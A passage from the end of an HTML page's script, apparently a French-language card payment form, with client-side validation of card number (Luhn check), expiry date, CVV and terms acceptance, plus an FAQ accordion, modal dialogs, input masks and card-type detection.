            }
            
            input.parentElement.classList.remove('error');
            return true;
        }
        
        function validateCardNumber() {
            const input = document.getElementById('cardNumber');
            const error = document.getElementById('cardNumberError');
            let value = input.value.replace(/\s+/g, '');
            
            if (value === '') {
                input.parentElement.classList.add('error');
                error.textContent = 'Veuillez entrer un numéro de carte.';
                return false;
            }
            
            if (!/^(\d{4}\s?){3}\d{1,4}$/.test(input.value)) {
                input.parentElement.classList.add('error');
                error.textContent = 'Veuillez entrer un numéro de carte valide (16 chiffres).';
                return false;
            }
            
            if (!luhnCheck(value)) {
                input.parentElement.classList.add('error');
                error.textContent = 'Numéro de carte invalide. Veuillez vérifier.';
                return false;
            }
            
            input.parentElement.classList.remove('error');
            return true;
        }
        
        function luhnCheck(cardNumber) {
            let sum = 0;
            let shouldDouble = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                
                if (shouldDouble) {
                    if ((digit *= 2) > 9) digit -= 9;
                }
                
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            
            return (sum % 10) === 0;
        }
        
        function validateExpiryDate() {
            const input = document.getElementById('expiryDate');
            const error = document.getElementById('expiryDateError');
            let value = input.value;
            
            if (value === '') {
                input.parentElement.classList.add('error');
                error.textContent = 'Veuillez entrer une date d\'expiration.';
                return false;
            }
            
            if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(value)) {
                input.parentElement.classList.add('error');
                error.textContent = 'Format invalide. Utilisez MM/AA.';
                return false;
            }
            
            const [month, year] = value.split('/');
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear() % 100;
            const currentMonth = currentDate.getMonth() + 1;
            
            if (parseInt(year) < currentYear || 
                (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
                input.parentElement.classList.add('error');
                error.textContent = 'La carte est expirée.';
                return false;
            }
            
            input.parentElement.classList.remove('error');
            return true;
        }
        
        function validateCVV() {
            const input = document.getElementById('cvv');
            const error = document.getElementById('cvvError');
            const value = input.value;
            
            if (value === '') {
                input.parentElement.classList.add('error');
                error.textContent = 'Veuillez entrer un code de sécurité.';
                return false;
            }
            
            if (!/^\d{3,4}$/.test(value)) {
                input.parentElement.classList.add('error');
                error.textContent = 'Le code doit contenir 3 ou 4 chiffres.';
                return false;
            }
            
            input.parentElement.classList.remove('error');
            return true;
        }
        
        function validateTerms() {
            const input = document.getElementById('termsAgreement');
            const error = document.getElementById('termsError');
            
            if (!input.checked) {
                input.parentElement.classList.add('error');
                error.textContent = 'Vous devez accepter les conditions pour continuer.';
                return false;
            }
            
            input.parentElement.classList.remove('error');
            return true;
        }
        
        function initFAQAccordion() {
            const faqItems = document.querySelectorAll('.faq-item');
            
            faqItems.forEach(item => {
                const question = item.querySelector('.faq-question');
                
                question.addEventListener('click', () => {
                    const isActive = item.classList.contains('active');
                    
                    faqItems.forEach(i => {
                        i.classList.remove('active');
                        i.querySelector('.faq-question').setAttribute('aria-expanded', 'false');
                    });
                    
                    if (!isActive) {
                        item.classList.add('active');
                        question.setAttribute('aria-expanded', 'true');
                    }
                });
                
                question.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter' || e.key === ' ') {
                        e.preventDefault();
                        question.click();
                    }
                });
            });
        }
        
        function initModals() {
            const termsModal = document.getElementById('termsModal');
            const termsLink = document.getElementById('termsLink');
            const termsModalClose = document.getElementById('termsModalClose');
            const termsModalAccept = document.getElementById('termsModalAccept');
            
            termsLink.addEventListener('click', (e) => {
                e.preventDefault();
                termsModal.hidden = false;
                termsModal.classList.add('active');
                document.body.style.overflow = 'hidden';
            });
            
            termsModalClose.addEventListener('click', () => {
                termsModal.classList.remove('active');
                setTimeout(() => {
                    termsModal.hidden = true;
                    document.body.style.overflow = '';
                }, 300);
            });
            
            termsModalAccept.addEventListener('click', () => {
                document.getElementById('termsAgreement').checked = true;
                validateTerms();
                termsModal.classList.remove('active');
                setTimeout(() => {
                    termsModal.hidden = true;
                    document.body.style.overflow = '';
                }, 300);
            });
            
            const privacyModal = document.getElementById('privacyModal');
            const privacyLink = document.getElementById('privacyLink');
            const privacyModalClose = document.getElementById('privacyModalClose');
            const privacyModalAccept = document.getElementById('privacyModalAccept');
            
            privacyLink.addEventListener('click', (e) => {
                e.preventDefault();
                privacyModal.hidden = false;
                privacyModal.classList.add('active');
                document.body.style.overflow = 'hidden';
            });
            
            privacyModalClose.addEventListener('click', () => {
                privacyModal.classList.remove('active');
                setTimeout(() => {
                    privacyModal.hidden = true;
                    document.body.style.overflow = '';
                }, 300);
            });
            
            privacyModalAccept.addEventListener('click', () => {
                document.getElementById('termsAgreement').checked = true;
                validateTerms();
                privacyModal.classList.remove('active');
                setTimeout(() => {
                    privacyModal.hidden = true;
                    document.body.style.overflow = '';
                }, 300);
            });
        }
        
        function initInputMasks() {
            const cardNumberInput = document.getElementById('cardNumber');
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 16) value = value.substring(0, 16);
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;
            });
            
            const expiryDateInput = document.getElementById('expiryDate');
            expiryDateInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2);
                }
                e.target.value = value;
            });
            
            const cvvInput = document.getElementById('cvv');
            cvvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
            });
        }
        
        function initCardTypeDetection() {
            const cardNumberInput = document.getElementById('cardNumber');
            const cardIcons = document.querySelectorAll('.card-icon');
            
            cardNumberInput.addEventListener('input', function() {
                const value = this.value.replace(/\s+/g, '');
                
                cardIcons.forEach(icon => {
                    icon.style.opacity = '0.3';
                });
                
                if (/^4/.test(value)) {
                    cardIcons[0].style.opacity = '1';
                } else if (/^5[1-5]/.test(value)) {
                    cardIcons[1].style.opacity = '1';
                } else if (/^3[47]/.test(value)) {
                    cardIcons[2].style.opacity = '1';
                }
            });
        }
    </script>
</body>
</html>
